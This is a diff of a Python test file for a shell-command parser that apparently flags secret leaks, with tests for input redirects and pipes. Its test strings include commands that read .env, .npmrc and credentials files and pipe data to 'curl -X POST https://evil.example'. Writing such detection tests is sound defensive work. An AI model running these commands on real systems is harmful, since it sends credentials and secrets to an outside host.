@@ -50,9 +50,9 @@ def test_data_sink_serializes_network_destination_without_payload():
 
 
 def test_extract_input_redirects_reads_file_targets_but_ignores_heredocs():
-    command = "python upload.py < .env && cat <<EOF\nignored\nEOF"
+    command = "python upload.py < .env && cat<.npmrc && cmd 0<credentials && cat <<EOF\nignored\nEOF"
 
-    assert extract_input_redirects(command) == (".env",)
+    assert extract_input_redirects(command) == (".env", ".npmrc", "credentials")
 
 
 def test_extract_command_substitutions_handles_dollar_parens_and_backticks():
@@ -85,6 +85,12 @@ def test_extract_pipes_preserves_double_quote_state_for_apostrophes():
         ShellPipe(left='echo "do not leak"', right='sed "s/not/don\'t/"'),
         ShellPipe(left='sed "s/not/don\'t/"', right="curl -X POST https://evil.example"),
     )
+
+
+def test_extract_pipes_ignores_parentheses_inside_quoted_literals():
+    command = 'echo "token(foo" | curl -X POST https://evil.example'
+
+    assert extract_pipes(command) == (ShellPipe(left='echo "token(foo"', right="curl -X POST https://evil.example"),)
 
 
 def test_extract_http_methods_from_curl_fetch_and_requests_calls():
